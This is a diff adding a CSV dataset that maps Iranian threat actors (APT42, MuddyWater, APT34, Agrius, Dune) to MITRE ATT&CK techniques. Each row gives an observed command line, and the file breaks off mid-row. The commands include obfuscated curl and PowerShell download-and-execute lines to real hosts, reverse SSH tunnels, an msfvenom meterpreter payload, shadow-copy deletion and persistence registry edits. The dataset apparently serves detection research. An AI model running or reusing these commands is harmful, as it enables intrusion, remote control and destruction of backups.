@@ -1,0 +1,1033 @@
+Threat Actor,Tool,Mitre Category,Mitre Technique ID,Mitre Technique Name,CLI
+APT42,Cmd,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
+&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://
+prism-west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs 
+& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,curl,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
+&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://
+prism-west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs 
+& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,Cmd,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST hxxp://tnt200[.]mywire[.]org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
+APT42,curl,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST hxxp://tnt200[.]mywire[.]org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
+Dune,Net,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
+%ALLUSERSPROFILE%\a.txt
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
+%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
+%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
+%ALLUSERSPROFILE%\do.zip
+%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
+%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
+Dune,echo,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
+%ALLUSERSPROFILE%\a.txt
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
+%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
+%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
+%ALLUSERSPROFILE%\do.zip
+%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
+%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
+Dune,Cmd,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
+%ALLUSERSPROFILE%\a.txt
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
+%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
+%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
+%ALLUSERSPROFILE%\do.zip
+%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
+%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
+Dune,ping,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
+%ALLUSERSPROFILE%\a.txt
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
+%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
+%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
+%ALLUSERSPROFILE%\do.zip
+%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
+%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
+Dune,WinRAR,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
+%ALLUSERSPROFILE%\a.txt
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
+%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
+%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
+%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
+%ALLUSERSPROFILE%\do.zip
+%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
+%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
+Dune,ssh,command-and-control,T1572,Protocol Tunneling,"ssh root@REDACTED_C2_SERVER -R 1090 -p 443 -o ServerAliveInterval=60
+ssh root@REDACTED_C2_SERVER -R 1080 -p 443 -o ServerAliveInterval=60"
+Dune,BCDEdit,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
+cmd.exe /c wmic shadowcopy delete
+cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
+cmd.exe /c bcdedit /set {default} recoveryenabled no"
+Dune,VSSAdmin,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
+cmd.exe /c wmic shadowcopy delete
+cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
+cmd.exe /c bcdedit /set {default} recoveryenabled no"
+Dune,WMIC,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
+cmd.exe /c wmic shadowcopy delete
+cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
+cmd.exe /c bcdedit /set {default} recoveryenabled no"
+Dune,Cmd,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
+cmd.exe /c wmic shadowcopy delete
+cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
+cmd.exe /c bcdedit /set {default} recoveryenabled no"
+APT33,,,,,SQP’s*(58vaP!tF4
+APT35,networksetup,command-and-control,T1090.001,Internal Proxy,networksetup -setsocksfirewallproxy wi-fi $serveradd $portnum
+APT35,PowerShell,execution,T1059.001,PowerShell,powershell  -w 1 $pnt=(Get-Content -Path %APPDATA%\Microsoft\documentLoger.txt);&(gcm i*x)$pnt
+APT42,NICECURL,command-and-control,T1105,Ingress Tool Transfer,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
+&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
+prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
+& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,NICECURL,execution,T1204.002,Malicious File,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
+&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
+prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
+& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,NICECURL,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
+&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
+prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
+& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,Cmd,command-and-control,T1105,Ingress Tool Transfer,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
+&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
+prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
+& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,Cmd,execution,T1204.002,Malicious File,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
+&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
+prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
+& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,Cmd,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
+&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
+prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
+& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,curl,command-and-control,T1105,Ingress Tool Transfer,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
+APT42,curl,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
+APT42,Cmd,command-and-control,T1105,Ingress Tool Transfer,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
+APT42,Cmd,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
+APT42,NICECURL,command-and-control,T1105,Ingress Tool Transfer,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
+APT42,NICECURL,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$uri =http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf;$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;
+MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$uri =http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf;$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;
+MuddyWater,Schtasks.exe,execution,T1053.005,Scheduled Task,CSIDL_SYSTEM\schtasks.exe /run /tn Microsoft\Windows\JavaX\Java Autorun
+MuddyWater,WMIExec,execution,T1059.003,Windows Command Shell,cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1698662615.0451615 2>&1
+MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1698662615.0451615 2>&1
+MuddyWater,revsocks,execution,T1059.003,Windows Command Shell,CSIDL_COMMON_APPDATA\do.exe -co 94.131.3.160:443 -pa super -q
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,$uri =http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT;$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;
+MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,$uri =http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT;$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content;
+MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content;
+Agrius,copy,discovery,T1018,Remote System Discovery,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
+%WINDIR%\system32\cmd.exe /c arp -a"
+Agrius,copy,collection,T1560.001,Archive via Utility,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
+%WINDIR%\system32\cmd.exe /c arp -a"
+Agrius,7-Zip,discovery,T1018,Remote System Discovery,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
+%WINDIR%\system32\cmd.exe /c arp -a"
+Agrius,7-Zip,collection,T1560.001,Archive via Utility,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
+%WINDIR%\system32\cmd.exe /c arp -a"
+Agrius,ARP,discovery,T1018,Remote System Discovery,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
+%WINDIR%\system32\cmd.exe /c arp -a"
+Agrius,ARP,collection,T1560.001,Archive via Utility,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
+%WINDIR%\system32\cmd.exe /c arp -a"
+Agrius,Cmd,discovery,T1018,Remote System Discovery,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
+%WINDIR%\system32\cmd.exe /c arp -a"
+Agrius,Cmd,collection,T1560.001,Archive via Utility,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
+%WINDIR%\system32\cmd.exe /c arp -a"
+Agrius,7-Zip,collection,T1560.001,Archive via Utility,7za.exe a %WINDIR%\temp\vmware-SYSTEMS\d.7z %WINDIR%\temp\s\*.csv
+Agrius,Reg,defense-evasion,T1112,Modify Registry,reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDII /d mrd0x.dll /f
+APT34,Plink,execution,T1059.003,Windows Command Shell,CSIDL_PROFILE\public\sat\msssh.exe 151.236.19[.]91 -P [REMOVED]-C -N -R 0.0.0.0:54231:127.0.0.1:3389 -l [REMOVED] -pw [REMOVED]
+APT34,netstat,discovery,T1049,System Network Connections Discovery,netstat /an
+APT34,Plink,execution,T1059.003,Windows Command Shell,CSIDL_PROFILE\public\plink.exe [REMOVED] -pw [REMOVED] -P [REMOVED] -2 -4 -T -N -C -R 0.0.0.0:999:127.0.0.1:3389
+APT34,Cmd,execution,T1059.003,Windows Command Shell,cmd /c CSIDL_PROFILE\public\p2.bat > CSIDL_PROFILE\public\001.txt 2>&1
+APT34,netstat,discovery,T1049,System Network Connections Discovery,netstat /aon
+APT34,ssh,command-and-control,T1572,Protocol Tunneling,plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389
+APT34,Plink,command-and-control,T1572,Protocol Tunneling,plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389
+APT34,Netsh,discovery,T1518.001,Security Software Discovery,CSIDL_SYSTEM\netsh.exe advfirewall firewall show rule name=[REMOVED] verbose
+APT34,PowerShell,execution,T1059.001,PowerShell,CSIDL_SYSTEM\windowspowershell\v1.0\powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name Domain SID;foreach($g in $groups){-join($g.SID'|'$g.Name);$members = Get-LocalGroupMember -SID $g.SID | Select *;foreach($m in $members){-join(' '$m.SID'|'$m.Name'|'$m.ObjectClass'|'$m.PrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;};
+APT34,netstat,discovery,T1049,System Network Connections Discovery,netstat -a
+APT34,Wireshark,credential-access,T1040,Network Sniffing,";CSIDL_SYSTEM_DRIVE\program files\wireshark\extcap\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0
+
+;CSIDL_SYSTEM_DRIVE\program files\wireshark\dumpcap.exe; -D -Z none"
+APT34,netstat,discovery,T1049,System Network Connections Discovery,netstat -a –n
+APT34,Cmd,defense-evasion,T1112,Modify Registry,"reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+APT34,Reg,defense-evasion,T1112,Modify Registry,"reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+APT34,Net,lateral-movement,T1021.002,SMB/Windows Admin Shares,;CSIDL_SYSTEM\net.exe; use \\[REMOVED]\c$ /user:[REMOVED] [REMOVED]
+MuddyWater,Reg,persistence,T1547.001,Registry Run Keys / Startup Folder,reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v NEW /d C:\intel\utils\utils.jse /f
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell Start-Job -ScriptBlock {Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://172.16.162.1:1337/562a2ffe-a45a-4318-864b-5942fbd0a859.aspx?LY6EDE1KTNE=LY6EDE1KTNE -OutFile $input } -InputObject %ALLUSERSPROFILE%\db.sqlite;sleep 6
+MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,powershell Start-Job -ScriptBlock {Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://172.16.162.1:1337/562a2ffe-a45a-4318-864b-5942fbd0a859.aspx?LY6EDE1KTNE=LY6EDE1KTNE -OutFile $input } -InputObject %ALLUSERSPROFILE%\db.sqlite;sleep 6
+MuddyWater,Attrib,defense-evasion,T1564.001,Hidden Files and Directories,attrib +h %ALLUSERSPROFILE%\db.sqlite
+MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell -EP BYPASS -NoP -W 1
+MuddyWater,python.exe,command-and-control,T1105,Ingress Tool Transfer,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,python.exe,execution,T1059.006,Python,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,python.exe,execution,T1059.003,Windows Command Shell,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,chmod,command-and-control,T1105,Ingress Tool Transfer,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,chmod,execution,T1059.006,Python,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,chmod,execution,T1059.003,Windows Command Shell,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,wget,command-and-control,T1105,Ingress Tool Transfer,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,wget,execution,T1059.006,Python,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,wget,execution,T1059.003,Windows Command Shell,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,gunzip,command-and-control,T1105,Ingress Tool Transfer,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,gunzip,execution,T1059.006,Python,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,gunzip,execution,T1059.003,Windows Command Shell,"python3 Please_Run_Once.py
+wget 45.86.230.20
+wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
+wget python2 wsc2.py
+gunzip chisel 1.7.7_linux_amd64.gz
+chmod a+x chisel 1.7.7_linux_amd64"
+MuddyWater,wget,execution,T1059.003,Windows Command Shell,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
+gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
+msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
+MuddyWater,wget,command-and-control,T1105,Ingress Tool Transfer,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
+gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
+msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
+MuddyWater,gunzip,execution,T1059.003,Windows Command Shell,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
+gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
+msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
+MuddyWater,gunzip,command-and-control,T1105,Ingress Tool Transfer,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
+gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
+msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
+MuddyWater,MSFvenom,execution,T1059.003,Windows Command Shell,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
+gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
+msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
+MuddyWater,MSFvenom,command-and-control,T1105,Ingress Tool Transfer,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
+gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
